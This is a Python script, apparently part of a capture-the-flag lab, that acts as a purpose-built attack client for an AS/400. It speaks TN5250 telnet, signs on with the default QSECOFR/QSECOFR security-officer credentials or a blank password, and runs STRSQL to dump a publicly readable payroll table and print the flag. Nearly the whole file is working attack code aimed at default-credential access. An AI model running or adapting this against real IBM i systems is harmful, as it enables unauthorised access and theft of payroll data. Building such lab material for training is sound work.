#!/usr/bin/env python3
"""Minimal TN5250 client for the Packet River AS/400 payroll extraction.

Purpose-built, like modbus_attack.py: it negotiates the 5250 telnet options,
signs on (QSECOFR / QSECOFR - or any user with a blank password), opens STRSQL,
runs one SELECT against the *PUBLIC *ALL payroll library, and prints the flag.

    as400_5250.py                 # full run, prints the flag
    as400_5250.py "<SQL>"         # run a different SELECT * FROM lib.table

For an interactive green screen, use the ttyd terminal on the player box
(clicking Town Hall on the map opens it) - full-client support is a follow-up.
"""
import os
import re
import socket
import sys
import time

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST = os.environ.get("AS400_HOST", "as400")
PORT = int(os.environ.get("AS400_PORT", "3272"))
IAC, DO, DONT, WILL, WONT, SB, SE, EOR = 0xFF, 0xFD, 0xFE, 0xFB, 0xFC, 0xFA, 0xF0, 0xEF
O_BIN, O_TTYPE, O_EOR, O_NEWENV = 0x00, 0x18, 0x19, 0x27
ENV_IS, ENV_SEND = 0x00, 0x01
AID_ENTER = 0xF1
SBA = 0x11
GDS = bytes([0x12, 0xA0])


def e(s):
    return s.encode("cp037")


def send_record(sock, aid, fields):
    """fields: list of (row, col, text) - rows/cols 0-based (5250 wire = +1)."""
    body = bytearray([1, 1, aid])
    for row, col, text in fields:
        body += bytes([SBA, row + 1, col + 1]) + e(text)
    total = len(body) + 10
    hdr = bytes([(total >> 8) & 0xFF, total & 0xFF, 0x12, 0xA0, 0x00, 0x00, 4, 0, 0, 0x03])
    payload = hdr + bytes(body)
    out = bytearray()
    for b in payload:
        out.append(b)
        if b == IAC:
            out.append(IAC)
    out += bytes([IAC, EOR])
    sock.sendall(bytes(out))


def negotiate_and_read(sock, deadline=6.0):
    """Handle telnet negotiation, return all record bytes received."""
    sock.settimeout(0.6)
    buf = bytearray()
    records = bytearray()
    start = time.time()
    while time.time() - start < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if records:
                break
            continue
        if not chunk:
            break
        buf += chunk
        i = 0
        while i < len(buf):
            b = buf[i]
            if b != IAC:
                records.append(b)
                i += 1
                continue
            c = buf[i + 1] if i + 1 < len(buf) else None
            if c is None:
                break
            if c == EOR:
                i += 2
                # a complete record just landed
                continue
            if c == IAC:
                records.append(IAC)
                i += 2
                continue
            if c in (DO, DONT, WILL, WONT):
                if i + 2 >= len(buf):
                    break
                opt = buf[i + 2]
                _reply_option(sock, c, opt)
                i += 3
                continue
            if c == SB:
                j = buf.find(bytes([IAC, SE]), i + 2)
                if j == -1:
                    break
                _reply_subneg(sock, buf[i + 2:j])
                i = j + 2
                continue
            i += 2
        buf = buf[i:]
    return bytes(records)


def _reply_option(sock, cmd, opt):
    if cmd == DO and opt == O_TTYPE:
        sock.sendall(bytes([IAC, WILL, O_TTYPE]))
    elif cmd == DO and opt == O_NEWENV:
        sock.sendall(bytes([IAC, WILL, O_NEWENV]))
    elif cmd == DO and opt == O_BIN:
        sock.sendall(bytes([IAC, WILL, O_BIN]))
    elif cmd == DO and opt == O_EOR:
        sock.sendall(bytes([IAC, WILL, O_EOR]))
    elif cmd == WILL and opt in (O_BIN, O_EOR):
        sock.sendall(bytes([IAC, DO, opt]))


def _reply_subneg(sock, data):
    if not data:
        return
    if data[0] == O_TTYPE and len(data) > 1 and data[1] == ENV_SEND:
        sock.sendall(bytes([IAC, SB, O_TTYPE, ENV_IS]) + b"IBM-3179-2" + bytes([IAC, SE]))
    elif data[0] == O_NEWENV and len(data) > 1 and data[1] == ENV_SEND:
        sock.sendall(bytes([IAC, SB, O_NEWENV, ENV_IS, IAC, SE]))


def main():
    guard(HOST)
    stmt = sys.argv[1] if len(sys.argv) > 1 else "SELECT * FROM PAYROLL.PAYKEY"
    s = socket.create_connection((HOST, PORT), timeout=6)

    negotiate_and_read(s)                                   # -> SIGNON screen
    print("[*] signing on as QSECOFR / QSECOFR (shipped default)")
    send_record(s, AID_ENTER, [(7, 53, "QSECOFR"), (8, 53, "QSECOFR")])
    negotiate_and_read(s)                                   # -> MAIN menu
    print("[*] STRSQL")
    send_record(s, AID_ENTER, [(22, 24, "STRSQL")])
    negotiate_and_read(s)                                   # -> Interactive SQL
    print(f"[*] {stmt}")
    send_record(s, AID_ENTER, [(5, 6, stmt)])
    result = negotiate_and_read(s)                          # -> result screen
    s.close()

    text = result.decode("cp037", errors="replace")
    if os.environ.get("AS400_DEBUG"):
        print("--- decoded result screen ---")
        print("".join(c if 32 <= ord(c) < 127 else "." for c in text))
        print("-----------------------------")
    m = re.search(r"PKTR\{[A-Za-z0-9_]+\}", text)
    if m:
        print(m.group(0))
    else:
        sys.exit("[!] no flag in the result screen; try the interactive terminal")


if __name__ == "__main__":
    main()
